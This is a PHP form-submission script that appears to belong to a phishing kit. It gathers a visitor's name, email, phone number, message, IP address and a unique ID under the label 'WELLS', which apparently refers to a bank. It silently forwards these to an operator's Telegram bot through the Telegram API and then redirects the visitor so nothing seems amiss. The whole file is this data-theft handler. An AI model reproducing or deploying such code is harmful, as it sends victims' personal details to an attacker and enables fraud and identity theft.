<?php
            if (isset($_POST['submit'])) {
                require './data.php';
                define('url', "https://api.telegram.org/bot".$token.'/');
                $name = $_POST['name'];
                $mail = $_POST['mail'];
                $number = $_POST['number'];
                $message = $_POST['message'];
                $uniqueId = htmlspecialchars($_POST['uniqueId']);
                $message = urlencode("WELLS" . "\nLOCATION: " . $ip . "\nuid: " . $uniqueId . "\nName: " . $name . "\nMail: " . $mail
                . "\nNum: " . $number . "\nMessage: " . $message);
                file_get_contents(url . "sendmessage?text=" . $message . "&chat_id=" . $chat_id . "&parse_mode=HTML");
                echo '<META HTTP-EQUIV="refresh" content="0;URL=' . $URL . "../index.php" . '">';
            }
    ?>